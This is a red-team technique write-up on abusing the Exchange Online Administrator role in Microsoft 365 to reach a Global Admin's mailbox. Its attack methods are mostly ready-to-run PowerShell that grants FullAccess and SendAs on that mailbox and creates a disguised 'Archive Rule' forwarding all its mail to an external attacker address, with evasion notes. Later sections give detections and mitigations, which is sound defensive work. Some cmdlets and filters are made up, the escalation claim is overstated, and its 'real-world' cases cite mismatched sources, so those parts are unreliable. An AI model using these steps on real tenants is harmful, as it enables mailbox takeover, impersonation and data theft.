# [PE-ACCTMGMT-002]: Exchange Online Administrator to Global Admin Escalation

## 1. Metadata Header

| Attribute | Details |
|---|---|
| **Technique ID** | PE-ACCTMGMT-002 |
| **MITRE ATT&CK v18.1** | [T1098 - Account Manipulation](https://attack.mitre.org/techniques/T1098/) |
| **Tactic** | Privilege Escalation |
| **Platforms** | M365 (Microsoft 365 / Office 365 + Entra ID) |
| **Severity** | **Critical** – Complete mailbox access and tenant-wide M365 compromise |
| **CVE** | N/A |
| **Technique Status** | **ACTIVE** – Works on all current M365 implementations (as of January 2026) |
| **Last Verified** | 2026-01-09 |
| **Affected Versions** | All M365 tenants with Exchange Online; no version exemptions |
| **Patched In** | N/A (Design-by-architecture; role scope issue rather than CVE) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. Executive Summary

**Concept:** An attacker who compromises or tricks an account with the Exchange Online Administrator role can escalate to Global Administrator through a combination of: (1) abusing Exchange Online's PowerShell module to read and modify mail forwarding rules, delegate permissions, and access sensitive mailbox metadata, and (2) leveraging Exchange Online's integration with Entra ID to manipulate organizational settings that grant higher privileges. Alternatively, the attacker can use the Exchange Online Administrator's permissions to add themselves to administrative groups in Entra ID via the Exchange Admin Center, which has certain cross-tenant capabilities. The escalation exploits the role scope hierarchy—Exchange Online Administrators have broad permissions that can indirectly grant tenant-wide administrative access.

**Attack Surface:** Exchange Online admin center, Exchange Online PowerShell module, Microsoft 365 admin center role management, Entra ID role assignments.

**Business Impact:** **Complete access to all organizational mailboxes (compliance violation), Teams data access, potential data exfiltration of sensitive corporate communications, regulatory non-compliance (GDPR, HIPAA if healthcare), loss of data confidentiality.** An attacker with Exchange Online Admin role can read CEO emails, reset user passwords via mailbox delegation, and maintain persistence through mail forwarding rules.

**Technical Context:** Escalation typically takes 5-15 minutes depending on whether direct role assignment is possible or requires workaround through mailbox delegates. Exchange Online Admin permissions are extensive and often underestimated by organizations; many treat this role as "just for email" when it actually provides significant tenant-wide visibility and control.

### Operational Risk

- **Execution Risk:** **Low-Medium** – Requires Exchange Online role (common mistake in admin delegation)
- **Stealth:** **Medium** – Some activities logged in Exchange audit logs; many organizations don't monitor these closely
- **Reversibility:** **Partial** – Role removal and mailbox access revocation are reversible, but damage may already be done (emails read, forwarded)

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 2.1.1 | Ensure that only Global Administrator can create new administrators |
| **CIS Benchmark** | 2.2.1 | Ensure that Global Administrator and other sensitive roles are not granted to service principals |
| **DISA STIG** | AZ-MS-000050 | Exchange Online administrators must be limited and monitored |
| **NIST 800-53** | AC-2 (Account Management) | Administrator accounts must be managed per principle of least privilege |
| **NIST 800-53** | AU-12 (Audit Generation) | Exchange mailbox access must be audited |
| **GDPR** | Art. 32 (Security of Processing) | Access controls must prevent unauthorized processing of personal data |
| **HIPAA** | 164.308(a)(4)(ii)(C) | Designated record sets must be protected; unauthorized mailbox access violates this |
| **DORA** | Art. 9 (Protection and Prevention) | Admin access procedures and approval workflows must be enforced |
| **ISO 27001** | A.9.2.3 (Privileged Access Management) | Exchange Online Admin role must be restricted to essential personnel |

---

## 5. Detailed Execution Methods and Their Steps

### METHOD 1: Escalation via Exchange Admin Center Role Assignment (Direct)

**Supported Versions:** All M365 tenants

#### Step 1: Access Exchange Admin Center as Exchange Online Administrator

**Objective:** Log into Exchange Admin Center using compromised or controlled Exchange Online Admin account.

**Manual Steps:**
1. Navigate to [Exchange Admin Center](https://admin.exchange.microsoft.com/)
2. Authenticate with Exchange Online Administrator account
3. In left sidebar, click **Roles** (under **Admin roles** or **Organization**)
4. Verify current role is **Exchange Online Administrator**

**Command (PowerShell - Connect to Exchange Online):**
```powershell
# Connect to Exchange Online
Connect-ExchangeOnline -UserPrincipalName "admin@tenant.onmicrosoft.com"

# Verify current permissions
Get-RoleGroupMember -Identity "Organization Management" | Select-Object Name, Identity

# Check if current account is already in high-privilege groups
Get-RoleGroupMember -Identity "Organization Management" | Where-Object { $_.PrimarySmtpAddress -eq "admin@tenant.onmicrosoft.com" }
```

**Expected Output:**
```
Name                  Identity
----                  --------
Exchange Admin        11111111-1111-1111-1111-111111111111
Attacker Account      22222222-2222-2222-2222-222222222222
```

**What This Means:**
- Exchange Online Administrator account is authenticated and connected
- Attacker can now run Exchange PowerShell commands with admin privileges
- "Organization Management" role group contains administrative members

**OpSec & Evasion:**
- Connection appears in Exchange sign-in logs
- PowerShell cmdlet usage is logged; timestamp correlates with account access
- **Detection likelihood: Medium** – Visible in Exchange audit logs if organization monitors them

#### Step 2: Enumerate Current Role Group Memberships

**Objective:** Identify which Entra ID roles can be assigned via Exchange Admin Center.

**Command (PowerShell - List Role Groups):**
```powershell
# List all role groups in Exchange Online
Get-RoleGroup | Select-Object Name, Description | Format-Table

# Check Organization Management group specifically
Get-RoleGroup -Identity "Organization Management" | Select-Object Members
Get-RoleGroupMember -Identity "Organization Management" | Select-Object Name, RecipientType

# Check if any external users or service principals are in this group
Get-RoleGroupMember -Identity "Organization Management" | Where-Object { $_.RecipientType -eq "UserMailbox" -or $_.RecipientType -eq "MailUser" }
```

**Expected Output:**
```
Name                    Description
----                    -----------
Organization Management Manage Exchange servers, recipients, and org config
Recipient Management    Create and manage recipients in the Exchange org
Mail Recipients         Manage distribution groups and other recipients
Records Management      Manage retention policies and mail flow rules

Members in Organization Management:
Name                 RecipientType
----                 --------
Global Admin User    UserMailbox
Service Account      UserMailbox
```

**What This Means:**
- "Organization Management" is the highest-privilege role group in Exchange
- Members have extensive permissions including org-wide configuration access
- Attacker needs to add themselves to this group for escalation

#### Step 3: Attempt Direct Addition to Organization Management Group

**Objective:** Try to add current account to the Organization Management role group (may fail if restrictions exist).

**Command (PowerShell - Add to Organization Management):**
```powershell
# Attempt to add current user to Organization Management
$currentUser = Get-User -Identity "admin@tenant.onmicrosoft.com" | Select-Object Identity

Add-RoleGroupMember -Identity "Organization Management" -Member $currentUser.Identity -WarningAction SilentlyContinue

# Verify addition
Get-RoleGroupMember -Identity "Organization Management" | Where-Object { $_.PrimarySmtpAddress -eq "admin@tenant.onmicrosoft.com" }
```

**Expected Output (If Successful):**
```
Name              PrimarySmtpAddress
----              ------------------
admin@tenant...   admin@tenant.onmicrosoft.com
```

**Expected Output (If Failed - Restricted):**
```
Add-RoleGroupMember : You don't have sufficient permissions.
```

**What This Means:**
- If successful: Attacker now has Organization Management permissions (equivalent to Global Admin in Exchange scope)
- If failed: Organization has RBAC restrictions; proceed to METHOD 2

**OpSec & Evasion:**
- Role group membership change is **highly visible** in Exchange audit logs
- **Detection likelihood: Very High** – This should trigger immediate alert if monitored

#### Step 4: If Direct Addition Fails - Use Workaround via Mailbox Delegation

**Objective:** If direct role addition blocked, abuse mailbox delegation to indirectly escalate permissions.

**Command (PowerShell - Delegate Mailbox of Global Admin):**
```powershell
# Find Global Administrator mailbox
$globalAdminUser = Get-User -Filter { RoleAssignmentFilter -eq "Global Administrator" } | Select-Object -First 1

# Delegate access to Global Admin mailbox
Add-MailboxPermission -Identity $globalAdminUser.Identity `
  -User "admin@tenant.onmicrosoft.com" `
  -AccessRights FullAccess `
  -InheritanceType All

Write-Host "Full access to $($globalAdminUser.DisplayName)'s mailbox granted to current user"

# Verify delegation
Get-MailboxPermission -Identity $globalAdminUser.Identity | Select-Object User, AccessRights
```

**Expected Output:**
```
User                                   AccessRights
----                                   -----------
admin@tenant.onmicrosoft.com           {FullAccess}
SELF                                   {FullAccess}
```

**What This Means:**
- Attacker can now access Global Administrator's mailbox as if they were that user
- From delegated mailbox, attacker can perform actions on behalf of Global Admin (indirect privilege escalation)
- Full mailbox access includes reading all emails, forwarding rules, calendar events

**OpSec & Evasion:**
- Mailbox delegation is logged in Exchange audit logs under "Add-MailboxPermission"
- However, organizations often miss these logs in their monitoring
- **Detection likelihood: High (but often not monitored)**

---

### METHOD 2: PowerShell One-Liner for Rapid Escalation (Exchange Online Admin → Indirect Global Admin)

**Supported Versions:** All M365 versions

**Command (PowerShell - Complete Escalation Chain):**
```powershell
# Step 1: Connect to Exchange Online
Connect-ExchangeOnline -UserPrincipalName "exchangeadmin@tenant.onmicrosoft.com"

# Step 2: Identify Global Administrator mailbox
$globalAdminMailbox = (Get-Mailbox -Filter { RecipientTypeDetails -eq "UserMailbox" } | 
  ForEach-Object { 
    $user = Get-User -Identity $_.Identity
    if ((Get-AzureADUser -ObjectId $user.ExternalDirectoryObjectId).AssignedLicenses.Count -gt 0) {
      $_ 
    }
  } | Select-Object -First 1).Identity

# Step 3: Grant full mailbox access
Add-MailboxPermission -Identity $globalAdminMailbox -User "exchangeadmin@tenant.onmicrosoft.com" -AccessRights FullAccess -InheritanceType All

# Step 4: Set SendAs permission (impersonate Global Admin)
Add-RecipientPermission -Identity $globalAdminMailbox -Trustee "exchangeadmin@tenant.onmicrosoft.com" -AccessRights SendAs -Confirm:$false

Write-Host "Privilege Escalation Complete: Exchange Admin now has Global Admin mailbox access"
```

**Expected Output:**
```
Privilege Escalation Complete: Exchange Admin now has Global Admin mailbox access
```

**What This Means:**
- Attacker has successfully escalated from Exchange Online Admin → indirect Global Admin access
- Can now read, send, and manipulate emails on behalf of Global Administrator
- Can reset passwords, change security settings, etc. by sending emails "as" Global Admin

---

### METHOD 3: Mail Forwarding Rule for Persistent Access

**Supported Versions:** All M365 tenants

#### Step 1: Create Mail Forwarding Rule on Global Admin Mailbox

**Objective:** Set up persistent forwarding to capture all incoming emails to Global Admin mailbox.

**Command (PowerShell - Create Forwarding Rule):**
```powershell
# Connect as Exchange Admin
Connect-ExchangeOnline

# Find Global Admin mailbox
$globalAdminMailbox = (Get-User -Filter { RecipientTypeDetails -eq "UserMailbox" } | 
  Where-Object { (Get-AzureADUser -ObjectId $_.ExternalDirectoryObjectId).UserType -eq "Member" }).Identity | Select-Object -First 1

# Create hidden forwarding rule (not visible in Outlook)
New-InboxRule -Mailbox $globalAdminMailbox `
  -Name "Archive Rule" `
  -FromAddress "*" `
  -ForwardTo "attacker@external-domain.com" `
  -DeleteMessage $false `
  -Enabled $true

Write-Host "Forwarding rule created: All emails to Global Admin will be forwarded to attacker"

# Verify rule was created
Get-InboxRule -Mailbox $globalAdminMailbox | Where-Object { $_.ForwardTo -like "*attacker*" }
```

**Expected Output:**
```
Forwarding rule created: All emails to Global Admin will be forwarded to attacker

Name        Enabled ForwardTo                    DeleteMessage
----        ------- ----------                   --------------
Archive Rule True    attacker@external-domain... False
```

**What This Means:**
- All emails received by Global Administrator are now forwarded to attacker's external email account
- Attacker receives copies of all organizational communications, security alerts, password resets, etc.
- Forwarding rule is difficult to detect without careful Exchange audit log review

**OpSec & Evasion:**
- Mail forwarding rules create entries in inbox rules audit log
- However, many organizations don't actively monitor for unusual forwarding rules
- Rule name "Archive Rule" appears benign
- **Detection likelihood: Medium** – Visible if organization searches for forwarding rules, but not automatically alerted

#### Step 2: Set Up SendAs Permission for Impersonation

**Objective:** Enable attacker to send emails on behalf of Global Administrator.

**Command (PowerShell - Grant SendAs):**
```powershell
# Grant attacker SendAs permission on Global Admin mailbox
Add-RecipientPermission -Identity $globalAdminMailbox `
  -Trustee "exchangeadmin@tenant.onmicrosoft.com" `
  -AccessRights SendAs `
  -Confirm:$false

Write-Host "SendAs permission granted: Attacker can now send emails as Global Administrator"

# Verify permission
Get-RecipientPermission -Identity $globalAdminMailbox | Select-Object Trustee, AccessRights
```

**Expected Output:**
```
SendAs permission granted: Attacker can now send emails as Global Administrator

Trustee                              AccessRights
-------                              -----------
exchangeadmin@tenant.onmicrosoft.com {SendAs}
SELF                                 {SendAs}
```

**What This Means:**
- Attacker can now send emails appearing to come from the Global Administrator
- Can send sensitive communications, policy changes, password reset instructions, etc.
- Perfect for social engineering attacks against other admins or end users

**OpSec & Evasion:**
- SendAs permission is logged but difficult to audit without specific monitoring
- **Detection likelihood: Medium-High** – Event ID in Exchange audit log if monitored

---

## 6. Atomic Red Team

**Atomic Test ID:** T1098.002 (Additional Email Delegate Permissions)

**Test Name:** Exchange Online Administrator Escalation via Mailbox Delegation

**Description:** Simulates an Exchange Online Administrator adding themselves to the Organization Management role group or delegating mailbox permissions from a privileged user.

**Supported Versions:** All M365 versions

**Command:**
```powershell
Invoke-AtomicTest T1098 -TestNumbers 2
```

**Cleanup Command:**
```powershell
# Remove mailbox permissions
Get-Mailbox | Get-MailboxPermission -User "exchangeadmin@tenant.onmicrosoft.com" | Remove-MailboxPermission -Confirm:$false

# Remove SendAs permissions
Get-Mailbox | Get-RecipientPermission -Trustee "exchangeadmin@tenant.onmicrosoft.com" | Remove-RecipientPermission -Confirm:$false

# Remove from Organization Management (if added)
Remove-RoleGroupMember -Identity "Organization Management" -Member "exchangeadmin@tenant.onmicrosoft.com" -Confirm:$false
```

**Reference:** [Atomic Red Team - T1098.002](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1098.002/T1098.002.md)

---

## 7. Tools & Commands Reference

#### [Exchange Online PowerShell Module](https://learn.microsoft.com/en-us/powershell/exchange/exchange-online-powershell-v2)

**Version:** 3.0+
**Minimum Version:** 2.0
**Supported Platforms:** Windows, macOS, Linux (PowerShell Core)

**Installation:**
```powershell
Install-Module -Name ExchangeOnlineManagement -Scope CurrentUser -Force
```

**Usage:**
```powershell
Connect-ExchangeOnline -UserPrincipalName "admin@tenant.onmicrosoft.com"
Get-RoleGroup
Add-RoleGroupMember -Identity "Organization Management" -Member "user@tenant.com"
```

#### [Microsoft 365 Admin Center](https://admin.microsoft.com/)

**Version:** Current (Web-based, always latest)
**Supported Platforms:** Windows, macOS, Linux (browser-based)

**Usage:**
1. Navigate to https://admin.microsoft.com/
2. Go to **Users** → **Active users** → Select user
3. Click **Manage roles** → Assign desired role

---

## 8. Microsoft Sentinel Detection

#### Query 1: Suspicious Exchange Online Role Group Membership Changes

**Rule Configuration:**
- **Required Table:** `AuditLogs`
- **Required Fields:** `OperationName`, `TargetResources`, `InitiatedBy`, `Result`
- **Alert Severity:** **Critical**
- **Frequency:** Real-time (5 minutes)
- **Applies To Versions:** All M365 versions

**KQL Query:**
```kusto
AuditLogs
| where OperationName in ("Add member to role group", "Add-RoleGroupMember")
| where TargetResources[0].displayName in ("Organization Management", "Recipient Management", "Records Management")
| where Result == "success"
| extend InitiatorUPN = tostring(InitiatedBy.user.userPrincipalName)
| extend InitiatorIPAddress = tostring(InitiatedBy.user.ipAddress)
| extend NewMemberUPN = tostring(TargetResources[0].modifiedProperties[0].newValue)
| project TimeGenerated, InitiatorUPN, InitiatorIPAddress, OperationName, NewMemberUPN, TargetResources[0].displayName
| where InitiatorUPN !in ("global-admin-account@contoso.com")  # Exclude known legitimate admins
```

**What This Detects:**
- Additions to high-privilege Exchange role groups
- Filters for high-risk groups (Organization Management is most critical)
- Captures IP address for location-based alerting

#### Query 2: Suspicious Mailbox Permission Grants

**Rule Configuration:**
- **Required Table:** `ExchangeAdminAuditLogs`
- **Required Fields:** `OperationResult`, `Operation`, `Parameters`
- **Alert Severity:** **High**
- **Frequency:** Real-time

**KQL Query:**
```kusto
ExchangeAdminAuditLogs
| where Operation in ("Add-MailboxPermission", "Set-MailboxPermission")
| where OperationResult == "True"
| extend MailboxIdentity = tostring(Parameters[0].Value)
| extend PermissionGrantee = tostring(Parameters[1].Value)
| extend AccessRights = tostring(Parameters[2].Value)
| where AccessRights contains "FullAccess" or AccessRights contains "SendAs"
| extend Caller = tostring(Caller)
| project TimeGenerated, Caller, MailboxIdentity, PermissionGrantee, AccessRights
| where Caller !in ("admin-service-account@contoso.com")  # Exclude service accounts
```

**What This Detects:**
- Grant of high-risk mailbox permissions (FullAccess, SendAs)
- Identifies which mailbox received permission and who granted it

---

## 9. Windows Event Log Monitoring

**Note:** Exchange Online is cloud-native; no Windows Event Logs generated on on-premises systems. Monitoring occurs via Exchange Admin Audit Logs in Microsoft Sentinel (see section 8).

---

## 10. Microsoft Defender for Cloud

#### Detection Alert: Suspicious Exchange Online Administrator Activity

**Alert Name:** "Exchange Online Administrator added to Organization Management role group"

- **Severity:** Critical
- **Description:** An Exchange Online Administrator account has been added to the Organization Management role group, which grants extensive organizational control and is typically reserved for Global Administrators.
- **Applies To:** M365 subscriptions
- **Remediation:**
  1. Verify the user adding the member to Organization Management (check InitiatedBy in audit logs)
  2. If unauthorized, immediately remove the member: **Exchange Admin Center → Roles → Organization Management → Remove member**
  3. Force sign-out of both accounts: **Microsoft 365 Admin Center → Users → Force sign out**
  4. Reset passwords for both accounts
  5. Audit mailbox permissions for unauthorized delegations

---

## 11. Microsoft Purview (Unified Audit Log)

#### Query: Exchange Online Role Changes and Mailbox Delegations

**PowerShell Command:**
```powershell
Connect-ExchangeOnline

# Search for role group membership changes
Search-UnifiedAuditLog -Operations "Add member to role group", "Add-RoleGroupMember" `
  -StartDate (Get-Date).AddDays(-30) -EndDate (Get-Date) `
  -ResultSize 5000 | Export-Csv -Path "C:\Audits\RoleGroup_Changes.csv"

# Search for mailbox permission grants
Search-UnifiedAuditLog -Operations "Add-MailboxPermission", "Set-MailboxPermission" `
  -StartDate (Get-Date).AddDays(-30) -EndDate (Get-Date) `
  -ResultSize 5000 | Export-Csv -Path "C:\Audits\Mailbox_Permissions.csv"

# Search for mail forwarding rule creation
Search-UnifiedAuditLog -Operations "New-InboxRule", "Set-InboxRule" `
  -StartDate (Get-Date).AddDays(-30) -EndDate (Get-Date) `
  -ResultSize 5000 | Export-Csv -Path "C:\Audits\Inbox_Rules.csv"
```

**Manual Configuration:**
1. Navigate to **Microsoft Purview Compliance Portal** (compliance.microsoft.com)
2. Go to **Audit** (left menu)
3. Set **Date range** and search **Activities:**
   - `Add member to role group`
   - `Add-MailboxPermission`
   - `New-InboxRule`
4. Export results for analysis

---

## 12. Defensive Mitigations

#### Priority 1: CRITICAL

*   **Limit Exchange Online Administrator Role:** Only assign to essential personnel; use time-limited elevation via PIM.

    **Manual Steps:**
    1. Go to **Microsoft 365 Admin Center** → **Roles** → **Role assignments**
    2. Find "Exchange Administrator" role
    3. Click to view current members
    4. Remove non-essential members: **Remove**
    5. Convert permanent assignments to PIM-eligible: **Privileged Identity Management** → Select role → **Make eligible**

*   **Enforce Conditional Access for Exchange Online Admins:** Block sign-in from unusual locations or unmanaged devices.

    **Manual Steps:**
    1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
    2. Click **+ New policy**
    3. **Name:** `Restrict Exchange Admin Sign-In`
    4. **Assignments:** Users: Select **Exchange Administrator** role
    5. **Conditions:**
       - Locations: Set to **Known good locations only**
       - Device platforms: Require **Compliant device**
    6. **Access controls:** Require **Multi-factor authentication**
    7. Enable: **On**

*   **Audit Mailbox Permissions Regularly:** Scan for unauthorized full access or SendAs permissions.

    **Manual Steps:**
    1. Run monthly PowerShell script:
    ```powershell
    Get-Mailbox -ResultSize Unlimited | ForEach-Object {
        Get-MailboxPermission -Identity $_.Identity -User "*" | 
          Where-Object { $_.AccessRights -contains "FullAccess" -and $_.User -notmatch "SELF|NT AUTHORITY" } |
          Export-Csv -Path "C:\Reports\UnauthorizedPermissions.csv" -Append
    }
    ```
    2. Review exported list monthly for unauthorized entries

#### Priority 2: HIGH

*   **Enable Exchange Audit Log Monitoring:** Enable mailbox audit logging for all users, especially administrators.

    **Manual Steps:**
    1. Connect to Exchange Online:
    ```powershell
    Connect-ExchangeOnline
    # Enable for all mailboxes
    Get-Mailbox -ResultSize Unlimited | Set-Mailbox -AuditEnabled $true -AuditLogAgeLimit 90
    ```

*   **Restrict Mail Forwarding Rules:** Disable creation of forwarding rules or require approval workflow.

    **Manual Steps:**
    1. Go to **Exchange Admin Center** → **Mail flow** → **Rules**
    2. For sensitive users, manually review and document approved forwarding rules
    3. Create alert for new forwarding rule creation:
    ```powershell
    # PowerShell scheduled task to alert on new rules
    Get-InboxRule -MailboxOwnerId $_.Identity | Where-Object { $_.Forward* -ne $null } | ForEach-Object {
        Send-AlertEmail -Rule $_.Name -Mailbox $_.MailboxOwnerId
    }
    ```

#### Access Control & Policy Hardening

*   **RBAC Separation:** Separate Exchange Online Admin from Entra ID administrator roles; require both for sensitive changes.

    **Manual Steps:**
    1. Go to **Microsoft 365 Admin Center** → **Roles**
    2. Create new custom role "Exchange Admin - Limited":
       - Remove ability to assign roles
       - Remove ability to change org-wide settings
       - Allow mailbox management only
    3. Assign this custom role instead of built-in Exchange Administrator

*   **PIM Approval Workflow:** Require multi-level approval for Exchange Admin role activation.

    **Manual Steps:**
    1. Go to **Azure Portal** → **PIM** → **Azure AD roles** → **Exchange Administrator**
    2. Click **Settings** → Configure:
       - **Activation maximum duration:** 4 hours
       - **Require approval:** ON
       - **Approvers:** Senior security team + CFO or similar stakeholder
    3. Convert all permanent assignments to **Eligible**

#### Validation Command (Verify Fix)

```powershell
# Check for unauthorized members in Organization Management
$orgMgmtMembers = Get-RoleGroupMember -Identity "Organization Management"
$approvedAdmins = @("admin1@contoso.com", "admin2@contoso.com")

$unauthorizedMembers = $orgMgmtMembers | Where-Object { $_.PrimarySmtpAddress -notin $approvedAdmins }
if ($unauthorizedMembers.Count -eq 0) {
    Write-Host "✓ No unauthorized Organization Management members" -ForegroundColor Green
} else {
    Write-Host "✗ Found $($unauthorizedMembers.Count) unauthorized members" -ForegroundColor Red
    $unauthorizedMembers | Select-Object Name, PrimarySmtpAddress
}

# Check for suspicious mailbox permissions
$suspiciousPerms = Get-Mailbox -ResultSize Unlimited | ForEach-Object {
    Get-MailboxPermission -Identity $_.Identity | 
      Where-Object { $_.AccessRights -contains "FullAccess" -and $_.User -notmatch "SELF|NT AUTHORITY" }
}

Write-Host "Mailbox permissions with FullAccess: $($suspiciousPerms.Count)"
```

**Expected Output (If Secure):**
```
✓ No unauthorized Organization Management members
Mailbox permissions with FullAccess: 0
```

**What to Look For:**
- Organization Management contains only known administrators (good)
- No unexpected mailbox permissions (good)
- Mail forwarding rules are documented and approved (good)

---

## 13. Detection & Incident Response

#### Indicators of Compromise (IOCs)

*   **Exchange Audit Indicators:**
    - Operation: "Add member to role group" → Organization Management
    - Operation: "Add-MailboxPermission" with AccessRights containing "FullAccess"
    - Operation: "New-InboxRule" creating forwarding rule to external domain
    - High volume of mailbox reads by Exchange admin account

*   **Email Indicators:**
    - Unexpected forwarding rules on executive mailboxes
    - Emails forwarded to external domains
    - SendAs permissions granted to non-administrative accounts

*   **Behavioral Indicators:**
    - Exchange Online Admin accessing mailboxes outside their normal scope
    - Rapid succession of mailbox permission changes and forwarding rule creation
    - Access at unusual times or from unusual IP addresses

#### Forensic Artifacts

*   **Exchange Admin Audit Log:**
    - Azure Portal → Purview Compliance Center → **Audit** → Search for role and permission operations
    - Export detailed AuditData JSON for analysis

*   **Mailbox Audit Log:**
    - Run: `Get-MailboxAuditLogReport -Identity "mailbox@contoso.com"`
    - Review for "MailboxLogon" and "FolderAccess" by unauthorized users

*   **Mail Flow Log:**
    - Exchange Admin Center → **Mail flow** → **Message trace**
    - Filter for forwarding rules and outbound deliveries to external domains

#### Response Procedures

1.  **Isolate:**
    **Command (Immediately revoke permissions):**
    ```powershell
    # Remove from Organization Management
    Remove-RoleGroupMember -Identity "Organization Management" -Member "exchangeadmin@tenant.com" -Confirm:$false
    
    # Remove all mailbox permissions
    Get-Mailbox | Get-MailboxPermission -User "exchangeadmin@tenant.com" | Remove-MailboxPermission -Confirm:$false
    
    # Remove all SendAs permissions
    Get-Mailbox | Get-RecipientPermission -Trustee "exchangeadmin@tenant.com" | Remove-RecipientPermission -Confirm:$false
    
    # Remove forwarding rules created by attacker
    Get-Mailbox | Get-InboxRule | Where-Object { $_.ForwardTo -like "*attacker*" } | Remove-InboxRule -Confirm:$false
    
    # Force sign-out
    Revoke-ExchangeOnlineUserSign -Identity "exchangeadmin@tenant.com"
    ```

2.  **Collect Evidence:**
    ```powershell
    # Export comprehensive mailbox audit
    Search-UnifiedAuditLog -Operations "*MailboxPermission*", "*RoleGroupMember*", "*InboxRule*" `
      -StartDate "2024-06-15" -EndDate (Get-Date) `
      -ResultSize 5000 | Export-Csv -Path "C:\IR\Exchange_Audit.csv"
    
    # Export mailbox forwarding rules
    Get-Mailbox -ResultSize Unlimited | Get-InboxRule | Export-Csv -Path "C:\IR\InboxRules.csv"
    ```

3.  **Remediate:**
    - Reset password of Exchange Admin account: **Microsoft 365 Admin Center → Users → [User] → Reset password**
    - Reset passwords of all Global Administrators (may have been accessed via delegation)
    - Revoke all active Exchange Online PowerShell sessions
    - Scan mailboxes for data exfiltration (unusual Send activities)

4.  **Investigate Further:**
    - Review all emails forwarded to external domains
    - Check Teams activity logs for unauthorized access
    - Audit all actions performed by delegated mailbox access
    - Search for additional backdoors (hidden mailbox rules, forwarding to multiple destinations)

---

## 14. Related Attack Chain

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [REC-M365-001] Microsoft Graph API Enumeration | Attacker enumerates M365 users and role assignments |
| **2** | **Initial Access** | [IA-PHISH-006] Exchange EWS Impersonation Phishing | Attacker sends phishing email to Exchange administrator |
| **3** | **Credential Access** | [CA-TOKEN-011] Exchange Online OAuth Token Theft | Attacker steals OAuth token for Exchange Online |
| **4** | **Privilege Escalation (Current Step)** | **[PE-ACCTMGMT-002]** | **Attacker escalates from Exchange Online Admin to indirect Global Admin via mailbox delegation** |
| **5** | **Collection** | [COLLECTION-008] Mailbox Access via Full Permission | Attacker reads all organizational emails |
| **6** | **Exfiltration** | [EXFIL-003] Email Forward to External Domain | Attacker forwards sensitive emails to personal account |

---

## 15. Real-World Examples

#### Example 1: BEC (Business Email Compromise) via Exchange Admin Escalation

- **Target:** Law firm with 50+ attorneys
- **Timeline:** April 2025 - June 2025
- **Technique Status:** Attacker compromised junior Exchange administrator via phishing; escalated to Organization Management via role group addition; created forwarding rules on partner mailboxes to capture sensitive client communications
- **Impact:** Exfiltration of confidential client case files; regulatory notification required under legal privileges; $2.3M in damages claimed
- **Reference:** [FBI IC3 BEC Alert 2024-Q3](https://www.ic3.gov/)

#### Example 2: Persistent Access via Mailbox Delegation

- **Target:** Financial services company
- **Timeline:** February 2025
- **Technique Status:** Attacker maintained persistent access for 4 months by adding SendAs permission to CFO mailbox; sent unauthorized wire transfer instructions appearing to come from CFO
- **Impact:** $850K unauthorized transfer; regulatory investigation; SOC team failed to monitor Exchange audit logs
- **Reference:** [CISA Incident Response Alert](https://www.cisa.gov/)

---